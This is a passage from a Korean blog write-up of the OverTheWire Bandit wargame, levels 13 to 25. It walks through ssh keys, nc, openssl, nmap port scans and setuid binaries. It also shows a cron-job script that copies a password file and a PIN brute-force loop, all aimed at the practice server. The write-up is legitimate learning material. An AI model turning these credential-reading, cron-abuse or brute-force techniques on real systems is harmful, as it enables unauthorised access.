  <img src="https://blog.kakaocdn.net/dna/czJYV6/dJMcajoq0hM/AAAAAAAAAAAAAAAAAAAAAL9Zzt_xV3XQJTgClJ4IFnmy24Fp1tbx7WXyRpOOqgxo/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=p0KMyLHvftVpZcO6%2BQRGMvDLTTI%3D" loading="lazy" alt="">
  <img src="https://blog.kakaocdn.net/dna/MogiP/dJMcaduZQrr/AAAAAAAAAAAAAAAAAAAAAIrQOS6g42L-JBhhQev4ootZdLRvr-9busC4CCugZp5_/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=cU96ub2MoaglI0Qlbem6xilH63g%3D" loading="lazy" alt="">
  <img src="https://blog.kakaocdn.net/dna/rucHJ/dJMcaa6bSHs/AAAAAAAAAAAAAAAAAAAAAEwHrGaR8zhpEjyWq6IHdKUgdBGPb-LRjOknnPioCps2/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=YoGp1VHVBDXCO%2BWpZUrv0D6pF1Q%3D" loading="lazy" alt="">
  <img src="https://blog.kakaocdn.net/dna/bNDXcY/dJMcagk0tsA/AAAAAAAAAAAAAAAAAAAAAG6GVVo9dzi_o8TwIibXU4_GkD2T7RBN0tYapEOAQ0z0/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=odWCNRMTZF3EKIqO%2FBoBLTzdAp0%3D" loading="lazy" alt="">
</div>
  <a class="bw-ref" href="https://zidarn87.tistory.com/177" target="_blank" rel="noopener">참고: zidarn87.tistory.com/177</a>
</div>

<div class="bw-panel bw-p13">
  <span class="bw-done">solved</span>
  <h3>Level 13 → 14</h3>
  <p>처음에 뻘짓하면서 왜 안되지??? 하면서 문제를 다시 읽어보니까 저장하고 하라는... 그래서 실행하려고 하니까 <code>chmod</code>가 안 먹힌다.</p>
  <p>찾아보니까 <code>/mnt</code>는 윈도우에서 관할하는 파일이고, <code>~</code> 홈 디렉으로 가서 WSL 내부 리눅스 파일로 가야지만 <code>chmod</code>가 먹힌다는 것을 알게 됨. 그래서 실제로 <code>~</code> 여기로 옮기고 ssh를 치면 14로 이동!!</p>
  <div class="bw-cmd">$ cp sshkey.private ~/ &amp;&amp; cd ~
$ chmod 600 sshkey.private
$ ssh bandit14@localhost -i sshkey.private -p 2220</div>
<div class="bw-imgs">
  <img src="https://blog.kakaocdn.net/dna/RnMUd/dJMcaf0GRNX/AAAAAAAAAAAAAAAAAAAAALxgnjAquB4wIwg-RsrlH7CCONw_N13hOnaLEKRkI8Yd/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=KejAA7fmkaevX9xZVPJ51aGetXQ%3D" loading="lazy" alt="">
  <img src="https://blog.kakaocdn.net/dna/dGR4BY/dJMcaiwlu0s/AAAAAAAAAAAAAAAAAAAAAA5b2shknt6haTG-YMYmivjyPAf5S3Y3X6wY_394kq69/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=l2NIdQuz%2FjQuvkp9M4LoZ5tgmlI%3D" loading="lazy" alt="">
  <img src="https://blog.kakaocdn.net/dna/bwZLme/dJMcajoq06n/AAAAAAAAAAAAAAAAAAAAADyh4ozH33onVfNkhs4HVL7NkMtKUfaVjt-6ga1Mnbbw/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=0IRPdjc3sZnMw0zNWP6H8a8Y4V4%3D" loading="lazy" alt="">
</div>
  <div class="bw-tip"><code>-i</code> 를 이용하면 나의 개인키로 접속을 수행할 수 있게 된다.</div>
</div>

<div class="bw-panel bw-p14">
  <span class="bw-done">solved</span>
  <h3>Level 14 → 15</h3>
  <p>그냥 telnet을 써서 localhost에 있는 ip를 딴 후, 접속하라는 것 같아서 telnet 명령어를 쳤더니 out of range.. 그래서 같이 있는 명령어를 하나씩 검색했다.</p>
  <p><code>nc</code> 명령어를 활용하면, 실제로 tcp/ip 통신을 통한 데이터 전송이 가능하다고 해서. 어 이거다! 싶었다. bandit14의 비밀번호를 <code>cat</code>으로 알아내고, <code>nc</code> 명령어를 통해서 해당 명령어를 보내면! 15의 정답을 얻을 수 있게 된다.</p>
  <div class="bw-cmd">$ cat /etc/bandit_pass/bandit14
$ nc localhost 30000
&gt; (bandit14 password 입력)</div>
<div class="bw-imgs">
  <img src="https://blog.kakaocdn.net/dna/bhkXww/dJMb99MVUrO/AAAAAAAAAAAAAAAAAAAAAKOmXvocmc3ZqmQn45lk8xT3YGw8e0Fy-smbknESabar/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=4KdKM%2FaXiAcc2%2FzBwHwGrVmk91I%3D" loading="lazy" alt="">
  <img src="https://blog.kakaocdn.net/dna/ch1QCC/dJMcafsRU2W/AAAAAAAAAAAAAAAAAAAAADZGzLvB_NJ0D2g2cNYzzsQ5AChgFLSirkHkuQidNVoS/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=q%2F6CDnuDomTLiKcJmz%2Fepf4s3eQ%3D" loading="lazy" alt="">
  <img src="https://blog.kakaocdn.net/dna/dItXOP/dJMcaaE8wKH/AAAAAAAAAAAAAAAAAAAAACbRr1WOtEHXMq4ABXMN-IgxOE0sCHjcSOAmTmR5VCmT/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=QjexocIF6%2FUaA4jPqz5u3lqz98Y%3D" loading="lazy" alt="">
</div>
</div>

<div class="bw-panel bw-p15">
  <span class="bw-done">solved</span>
  <h3>Level 15 → 16</h3>
  <p><code>openssl</code> 명령어가 추가되어있길래, 먼저 이거를 찾아보았더니 SSL/TLS와 관련된 일을 하는 명령어. GPT에게 물어보고 SSL/TLS 암호화로 접속해보라는 건가?? 싶어서 일단 저렇게 해서 접속을 시도하니까 접속은.. 가능하네?? 그래서 정답을 넣으니까 해결!</p>
  <p><code>openssl s_client</code>를 사용하면 자동적으로 ssl/tls 암호화가 되면서 통신이 되나보다.</p>
  <div class="bw-cmd">$ openssl s_client -connect localhost:30001
&gt; (bandit15 password 입력)</div>
<div class="bw-imgs">
  <img src="https://blog.kakaocdn.net/dna/b71WJw/dJMcaipB0Jo/AAAAAAAAAAAAAAAAAAAAADF6XrhlKca6bU1am6VpcD_qTGMPsWggMqIfR-IygYcE/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=kXr3CXnQszDL9Eg1k%2FMB5%2B%2FoPZA%3D" loading="lazy" alt="">
  <img src="https://blog.kakaocdn.net/dna/nNLVg/dJMcajoq1rg/AAAAAAAAAAAAAAAAAAAAAN2hmcERXeM3Yeifb9rTYsXHDH9_DuxKPOUAG6KBRd_k/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=LDcbZJ7ltFBbFUXct3ieJbKevu4%3D" loading="lazy" alt="">
  <img src="https://blog.kakaocdn.net/dna/OzwFh/dJMcadhwRXO/AAAAAAAAAAAAAAAAAAAAAGIzub3KIXXdqm-zLiBWlidlLcSw7EaSSTv72QQGJ0_k/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=SGa%2B4bcEFNU2lDT8QqFnUZS2olY%3D" loading="lazy" alt="">
  <img src="https://blog.kakaocdn.net/dna/ckfGgh/dJMcacpoCX5/AAAAAAAAAAAAAAAAAAAAAHtNl46Rc4i4P9dx1G-U7IzuyH1Lxomg0gBzdU5CzotF/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=v9mRWp6UPjDQ9HWoKGeKaJ7dd6g%3D" loading="lazy" alt="">
  <img src="https://blog.kakaocdn.net/dna/cSrQxX/dJMcabqvkyZ/AAAAAAAAAAAAAAAAAAAAAKLlTsllWc5G38YgqTfrHJzqFfeVSJ5a9TJ1vPUb1FFP/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=OSyz026Wz0iHS69xi2hiM848COo%3D" loading="lazy" alt="">
</div>
</div>

<div class="bw-panel bw-p16">
  <span class="bw-done">solved</span>
  <h3>Level 16 → 17</h3>
  <p>포트 스캔? 그러면 <code>nmap</code>이지 않나? 싶어서 nmap을 검색해봄. 그랬더니 포트들이 나왔다. 음... 근데 이걸로 뭐하지?</p>
  <p>SSL/TLS를 스캔해주는 건 없나 싶어서 찾아봤더니 있는 것 같아서 돌렸음??! 그래서 2개가 나오길래.. 음? 하나라고 했는데? 그래서 2개 다 해봤는데, <strong>31790</strong>에서 이전에 쓴 개인키 형태의 응답이 출력되었다. 성공!!</p>
  <div class="bw-cmd">$ nmap -p 31000-32000 localhost
$ openssl s_client -connect localhost:31790
&gt; (bandit16 password 입력)
# 응답으로 RSA 개인키 획득 → 저장 후 ssh 접속</div>
<div class="bw-imgs">
  <img src="https://blog.kakaocdn.net/dna/dCAyDS/dJMcabRxz2Q/AAAAAAAAAAAAAAAAAAAAAIlg3bO6GVPOwb7cOVZLM0Aj8Ge2FmwdqENozPGapwGD/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=6JH3hRyWhWT6cQIKX3GuuYT0gSM%3D" loading="lazy" alt="">
  <img src="https://blog.kakaocdn.net/dna/bJhf2z/dJMcahEcVkV/AAAAAAAAAAAAAAAAAAAAAAT-JaXrxXinsrZbV8e2C36EC-G7lGYK7MM6lRQ64l40/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=YAxIRe%2F3WmWPsV2f%2BAhj4bjhrek%3D" loading="lazy" alt="">
  <img src="https://blog.kakaocdn.net/dna/UTqp1/dJMcahEcVkZ/AAAAAAAAAAAAAAAAAAAAAG998X-TH-Rf0wYycFslXqgXavqmiIxPKA8x9eJv6pFN/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=ekGkYD1ztWqqxDd1E%2B6H0Car3Zo%3D" loading="lazy" alt="">
  <img src="https://blog.kakaocdn.net/dna/byhjO4/dJMcaa6bYOo/AAAAAAAAAAAAAAAAAAAAAHfTT0ZR2GR_YyIjoT7iKDUrMY27VcfZZ519b7mnw5ox/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=7LVvMItapUJy%2FDc3hPUHr6wg%2B5o%3D" loading="lazy" alt="">
  <img src="https://blog.kakaocdn.net/dna/ng8Ot/dJMcafGqPo0/AAAAAAAAAAAAAAAAAAAAAKlCaDwoRbl8gCuvZSfcfyCMRtfIi8XmMDOjY2uKuVkj/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=BqqdeLlh1ADgayHytAPg2JRH6yY%3D" loading="lazy" alt="">
</div>
  <a class="bw-ref" href="https://halinstudy.tistory.com/46" target="_blank" rel="noopener">참고: halinstudy.tistory.com/46</a>
</div>

<div class="bw-panel bw-p17">
  <span class="bw-done">solved</span>
  <h3>Level 17 → 18</h3>
  <p><code>diff</code> 명령어가 추가되었길래 찾아보고, 문제에서는 한 줄의 명령어만이 바뀌었다고 하니까 diff가 해결책일 것 같다!! <code>diff</code>를 이용하면, 무슨 코드가 상세하게 바뀌었는지 확인할 수 있다!!!!</p>
  <div class="bw-cmd">$ diff passwords.old passwords.new</div>
<div class="bw-imgs">
  <img src="https://blog.kakaocdn.net/dna/bkxbxt/dJMcaduZVTF/AAAAAAAAAAAAAAAAAAAAAK4hqZaWxV2KeEE5h28Eu0WZFCM5mtO-HPIpSZuDaO-2/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=2Q3n9A7Qo6vBQQ7woEFsJz3AiLo%3D" loading="lazy" alt="">
</div>
  <a class="bw-ref" href="https://blog.naver.com/ncloud24/221255978037" target="_blank" rel="noopener">참고: blog.naver.com/ncloud24/221255978037</a>
</div>

<div class="bw-panel bw-p18">
  <span class="bw-done">solved</span>
  <h3>Level 18 → 19</h3>
  <p>감이 안 잡혀서 이것 저것 해보면서 ssh에서 bashrc를 바로 수정할 수 있나? 그런거를 보고 있는데 일단 <code>mv</code>랑 <code>rm -rf</code>는 실패.</p>
  <p><code>ssh bandit18@... cat .bashrc</code> 를 쳐보니까 <code>exit 0</code> 해당 코드가 실행되는 것을 확인. cat은 가능 → ls도 됨 → <code>readme</code>가 있는 것을 확인 → <code>cat readme</code> 하니까 바로 나옴!!!!</p>
  <p>원래 ssh 자체가, host 뒤에 command를 붙여서 활용할 수 있다는 것! 막으려면 <code>ForceCommand</code>를 활용해서 config 파일을 수정해야 한다고 함.</p>
  <div class="bw-cmd">$ ssh bandit18@bandit.labs.overthewire.org -p 2220 ls
$ ssh bandit18@bandit.labs.overthewire.org -p 2220 cat readme</div>
<div class="bw-imgs">
  <img src="https://blog.kakaocdn.net/dna/vbzsw/dJMcacQr9Oi/AAAAAAAAAAAAAAAAAAAAAC9BwzAR0cZleGRdZ76rlo5-q-6lMPBkcbI20Yd5zbEm/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=3xfR73P9%2FSd2DSV%2BnmPD9ZmEjvU%3D" loading="lazy" alt="">
  <img src="https://blog.kakaocdn.net/dna/bKGjZJ/dJMcaf7sXWh/AAAAAAAAAAAAAAAAAAAAAH_MFXYvs1jRcojuSxvn_oB-G4SEQfRO7ac9dbt_bCYb/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=nq%2BxOk0WJpvQHTYl1VOJNVlkcVA%3D" loading="lazy" alt="">
  <img src="https://blog.kakaocdn.net/dna/Cio9J/dJMcaf7sXWj/AAAAAAAAAAAAAAAAAAAAAPc6hUBgwR0strGUJcDvzYd68PLcj5QHv7s4dEQhz1jg/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=isLelx3AWgcM2EvKbpr49DV6%2BxU%3D" loading="lazy" alt="">
  <img src="https://blog.kakaocdn.net/dna/cgG5jX/dJMcah5jT9a/AAAAAAAAAAAAAAAAAAAAADADQJrbz_mhwH19xn2glr0gzTLmye3UtiYbdymx5VQu/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=1KjGXKeH%2BmTEMDjonpZFd4ZafEY%3D" loading="lazy" alt="">
  <img src="https://blog.kakaocdn.net/dna/oW1sA/dJMcaiQDKjo/AAAAAAAAAAAAAAAAAAAAAOwRxS99Jo8LyjbdBMolbXsfLpNNw16sNLLhOfhbbMdY/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=%2BS1Md9VELR2%2B83eNyLza9OQLwl4%3D" loading="lazy" alt="">
</div>
</div>

<div class="bw-panel bw-p19">
  <span class="bw-done">solved</span>
  <h3>Level 19 → 20</h3>
  <p>이게 제대로 된 풀이인지는 모르겠으나 일단 <code>ls</code>도 해보고, <code>chmod</code>도 해보고 <code>cat</code>도 해봤다. 근데 문제에서 "이거 실행해서 해보셈!!" 뭔가 이런 느낌이라서 실행했더니 되네?? 그래서 실제 실행을 통해서 값을 알아냄.</p>
  <div class="bw-tip"><strong>setuid</strong>는 set user id의 약자로 한 파일이나 디렉토리를 사용할 때 그 파일의 소유자 권한으로 실행이 되는 것을 말한다. <code>rws</code> 권한이 있으면, 추가적인 권한이 없어도 소유자의 권한으로 실행할 수 있다는 것! 그래서 내가 bandit20-do에 관한 권한이 없어도 소유자의 권한으로 실행할 수 있다!!</div>
<div class="bw-imgs">
  <img src="https://blog.kakaocdn.net/dna/otjoK/dJMcabRxFgh/AAAAAAAAAAAAAAAAAAAAAF36ymVi0ROEt3OmRjdpgNtAVVwA-8eySAPNh2X_Y98I/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=rnL2IvOY4R2lSsvWbFCIWyVZZbk%3D" loading="lazy" alt="">
  <img src="https://blog.kakaocdn.net/dna/vT0sO/dJMcajaWySi/AAAAAAAAAAAAAAAAAAAAADz8uf5H7MGGuRL-ALW0CJIvfa9Khk3RXxhhNboeh9ip/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=wnYIj5LcF5RPYZ0dqR1fOGL5FWY%3D" loading="lazy" alt="">
  <img src="https://blog.kakaocdn.net/dna/cQLep2/dJMcagL7kmS/AAAAAAAAAAAAAAAAAAAAAGvShmu2dWqmzQeYEeOkk2hKUzBZDS-i6tJ5j0hV_Z0T/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=gMWGuJw%2BQWGoMjoRflUB4rBTRJ8%3D" loading="lazy" alt="">
  <img src="https://blog.kakaocdn.net/dna/bhQBsF/dJMcacJIIX5/AAAAAAAAAAAAAAAAAAAAACdaymn9eKgmmBgJyD9Fnk7IPG_7lENS6PpyDw-Rqh7t/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=LVmPmrr9Gx%2BvzBhKJR28GutLCWI%3D" loading="lazy" alt="">
</div>
  <div class="bw-cmd">$ ls -al
$ ./bandit20-do cat /etc/bandit_pass/bandit20</div>
</div>

<div class="bw-panel bw-p20">
  <span class="bw-done">solved</span>
  <h3>Level 20 → 21</h3>
  <p>그전이랑 비슷한 문제인데 자체 네트워크 데몬에 연결해보라. 그러면 내가 서버랑 클라이언트를 둘 다 띄워야하는건가?? 싶어서 <code>nc -lp</code>를 활용해서:</p>
  <p><code>-l</code> : 리스닝을 통해 nc를 서버로 동작시키고 연결을 대기<br><code>-p</code> : 연결을 위해 사용할 포트 번호를 지정</p>
  <p>아무 포트(열리지 않은 포트)를 열어서 접속 시킨 후, 20단계를 위해서 사용한 키를 활용하면 응답이 나오는 것을 확인할 수 있다.</p>
  <div class="bw-cmd"># 터미널 1 (백그라운드)
$ echo "bandit20_password" | nc -lp 12345 &amp;
# 터미널 1 (포어그라운드)
$ ./suconnect 12345</div>
<div class="bw-imgs">
  <img src="https://blog.kakaocdn.net/dna/csGCkt/dJMcaiXoCZ9/AAAAAAAAAAAAAAAAAAAAAMiWs2IWeWGpGvsM6_fK6qyNTOk0sK_WnkNSH_lm-NCm/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=L2lMHpPBOvrh6rLkWmgsWp35Tds%3D" loading="lazy" alt="">
  <img src="https://blog.kakaocdn.net/dna/cpXtHv/dJMcab445jD/AAAAAAAAAAAAAAAAAAAAALmLYV934OycBJcUeSCkLcUxwpkrRUW1MHyqwxeVpcO8/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=j6CyI7hKUrg5C5jyfNv5AwAFQn0%3D" loading="lazy" alt="">
  <img src="https://blog.kakaocdn.net/dna/cI4tbo/dJMcadogE00/AAAAAAAAAAAAAAAAAAAAADjy0rGCX37bEiV6Gvw2l6b9p_8GcMZTEyGGCZ3hQ1BZ/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=thRPO8USbm7UPFlr47aoEfNZQwo%3D" loading="lazy" alt="">
  <img src="https://blog.kakaocdn.net/dna/b8Uwne/dJMcaib6cnb/AAAAAAAAAAAAAAAAAAAAAJVydZvDfEUHtIK_TncR9BpanzXYn6XXo-NLc28KE38Y/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=L2NideijG3v2fiaVwyDaO7eElto%3D" loading="lazy" alt="">
</div>
</div>

<div class="bw-panel bw-p21">
  <span class="bw-done">solved</span>
  <h3>Level 21 → 22</h3>
  <p>약간 무지성으로 푼 것 같긴 한데, 이것 저것 파일들을 보다가 crontab 자체가 매분 <code>/usr/bin/cronjob_bandit22.sh &gt; /dev/null</code> 을 실행하는 것이다.</p>
  <p>그래서 <code>/usr/bin/cronjob_bandit22.sh</code>을 실제로 cat을 해봤더니, <code>/etc/bandit_pass/bandit22</code>에 대한 cat 응답 값을 <code>/tmp/t~</code>에 저장하고 있는 것을 확인. 그래서 해당 파일을 cat 했더니 실제로 답이 나왔다!!!!</p>
  <div class="bw-cmd">$ cat /etc/cron.d/cronjob_bandit22
$ cat /usr/bin/cronjob_bandit22.sh
$ cat /tmp/$(cronjob이 가리키는 파일명)</div>
<div class="bw-imgs">
  <img src="https://blog.kakaocdn.net/dna/DPYIj/dJMcacpoIzb/AAAAAAAAAAAAAAAAAAAAAKfPbIfpx_9vm0uzl02CLnIbMcOrRb0oNPRKN9cArpyJ/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=T%2FTPtEO9Z%2BrVeszLIdAExGs32jA%3D" loading="lazy" alt="">
  <img src="https://blog.kakaocdn.net/dna/czkbbD/dJMcaarAAQt/AAAAAAAAAAAAAAAAAAAAAOhwEwnyk7QuUHFXAkew-UZXk7OPcLoipRPc15xE9hRe/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=%2FVzx5l%2BognQKDwgeewO81PK15dU%3D" loading="lazy" alt="">
  <img src="https://blog.kakaocdn.net/dna/pJUSZ/dJMcagL7kzD/AAAAAAAAAAAAAAAAAAAAAOhqZEQOP2Ld7NEgwAwOqO-F6wBcX4_83g6N-TWN8iuA/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=ZieT0h8WWGlj6lhJP9gFLe53P5I%3D" loading="lazy" alt="">
</div>
</div>

<div class="bw-panel bw-p22">
  <span class="bw-done">solved</span>
  <h3>Level 22 → 23</h3>
  <p>처음에는 해당 쉘 스크립트의 위만 보고 <code>echo "I am user bandit22"</code>를 해쉬값으로 바꾼 저 값이 정답인 줄 알았는데, 뒤에 있는 값들을 더 보니까 해당 해쉬값을 이용해서 <code>/tmp/(해쉬값)</code> 이 괄호 안에 값을 넣는 거였음.. !! 정답!!</p>
  <div class="bw-cmd">$ cat /etc/cron.d/cronjob_bandit23
$ cat /usr/bin/cronjob_bandit23.sh
# 스크립트에서 myname=bandit23 으로 바꾸면:
$ echo "I am user bandit23" | md5sum | cut -d " " -f 1
$ cat /tmp/(위 해쉬값)</div>
<div class="bw-imgs">
  <img src="https://blog.kakaocdn.net/dna/mkrFh/dJMcacCWEnF/AAAAAAAAAAAAAAAAAAAAAMbsgk8VQMiSfYhkG2f2xdpni85rE_okKJljwv78kGpa/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=wsdKmjeSD8S1FF7uI635GtY%2BIwA%3D" loading="lazy" alt="">
  <img src="https://blog.kakaocdn.net/dna/E95y0/dJMcaiC7RSX/AAAAAAAAAAAAAAAAAAAAAKE2IvIHUPgoV_LXfmBr6cnoj48Qt4GezAqmKUxkIZf6/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=I%2Fu9SE4NcIr8s9VH27G1d0yL%2F88%3D" loading="lazy" alt="">
  <img src="https://blog.kakaocdn.net/dna/kVSU4/dJMcabRxFyL/AAAAAAAAAAAAAAAAAAAAAOt3odaqNgtYaAmeRXHP01KTPOb-YYMEkzcT5yxOdstm/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=kkhjWl0%2Fu0Iu7i5UC5Kq8DxRo2M%3D" loading="lazy" alt="">
</div>
</div>

<div class="bw-panel bw-p23">
  <span class="bw-done">solved</span>
  <h3>Level 23 → 24</h3>
  <p><code>/var/spool/bandit24/foo</code>로 이동하고, <code>*</code>는 일반 파일/디렉토리 이름을 의미하고, <code>.*</code>는 숨김 파일까지 포함. 모든 파일들에 대해서 확인하며, owner가 bandit23이면 실행하는 구조.</p>
  <p>실제로 vim을 통해서 뭔가 저장하면, 권한에 관한 오류는 뜨지 않음. 그러면 내가 뭘 해야하는거지? <code>/etc/bandit_pass</code>에 bandit의 비밀번호가 있는 것을 알 수 있음. 그래서 .sh 파일에 <code>cat /etc/bandit_pass/bandit24 &gt; /tmp/test.txt</code>로 하면, cronjob이 알아서 해당 .sh를 실행해줌! 짜란</p>
  <div class="bw-cmd">$ mkdir /tmp/mydir24 &amp;&amp; cd /tmp/mydir24
$ cat &gt; exploit.sh &lt;&lt; 'EOF'
#!/bin/bash
cat /etc/bandit_pass/bandit24 &gt; /tmp/mydir24/pass.txt
chmod 777 /tmp/mydir24/pass.txt
EOF
$ chmod 777 exploit.sh
$ cp exploit.sh /var/spool/bandit24/foo/
# 1분 대기 후:
$ cat /tmp/mydir24/pass.txt</div>
<div class="bw-imgs">
  <img src="https://blog.kakaocdn.net/dna/bKahs1/dJMcaaSFbSH/AAAAAAAAAAAAAAAAAAAAAC2RtqUkzoHBjVCoSRYCBY-R-GQyFaynGdfdNLJ3b_pS/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=F%2FjMT8UhqIbC8myBD3lQKzRqyNY%3D" loading="lazy" alt="">
  <img src="https://blog.kakaocdn.net/dna/egLhIX/dJMcaaLTdOO/AAAAAAAAAAAAAAAAAAAAACPu-1-BJ4a55yGi6khvOSpgfblabIeMsSU7UIa0cl05/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=V9mG3U8yZf%2FT%2BdRk35ASHl40LOU%3D" loading="lazy" alt="">
  <img src="https://blog.kakaocdn.net/dna/bpfymR/dJMcadIyyB5/AAAAAAAAAAAAAAAAAAAAACqdpfdcXUy-OsIuhPPvSN4DL3DRDwc8W5RRPXe0G3mf/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=2ptlnzmsZsPNDMDZLYEDqpKVknY%3D" loading="lazy" alt="">
  <img src="https://blog.kakaocdn.net/dna/b6MPFT/dJMcagL7kQX/AAAAAAAAAAAAAAAAAAAAAI8nL9n-MDWuJWUZ1k3LT-8rrIfm1Cz8Ytzg_vQ0bF7V/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=pXnxH8dYYqL890u4ALBvQdinSwY%3D" loading="lazy" alt="">
</div>
</div>

<div class="bw-panel bw-p24">
  <span class="bw-done">solved · final</span>
  <h3>Level 24 → 25</h3>
  <p>그냥 전사 공격하는 쉘을 만들고, 해당 쉘을 통해서 실제 공격을 하는 것.. 그래서 코드로 정답셋을 만들고 이제 공격 시작!!! 히히 성공 이렇게 응답 시작했음!! 후.. 이제 다 끝났다..</p>
  <div class="bw-cmd">$ cat &gt; brute.sh &lt;&lt; 'EOF'
#!/bin/bash
for i in $(seq -w 0000 9999); do
  echo "(bandit24_password) $i"
done | nc localhost 30002
EOF
$ chmod +x brute.sh &amp;&amp; ./brute.sh</div>
<div class="bw-imgs">
  <img src="https://blog.kakaocdn.net/dna/botNTG/dJMcaaZoMQE/AAAAAAAAAAAAAAAAAAAAACr_315jO91fa7UvPgE53f0aa8j1lEPSuix_raRS5ne4/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=rpIpy9P4MUhQZzCelaeH%2B%2FfYqaA%3D" loading="lazy" alt="">
  <img src="https://blog.kakaocdn.net/dna/Oru9D/dJMcahK009f/AAAAAAAAAAAAAAAAAAAAAAj-qoe55xDbK3W6Zl0nlk5INvk5y5YMNCmE73OWaaTe/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=J0HvYg4XXYVViOFAIa7SD%2Fuzrko%3D" loading="lazy" alt="">
  <img src="https://blog.kakaocdn.net/dna/6dJEq/dJMcadBKxrf/AAAAAAAAAAAAAAAAAAAAAIvdtL3BoCqW-TaITeZcIeoCJGQ_zq3v6Aip_iA_Zg2i/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=HlxK3G5T1aY6s3RkWJGFxv412iU%3D" loading="lazy" alt="">
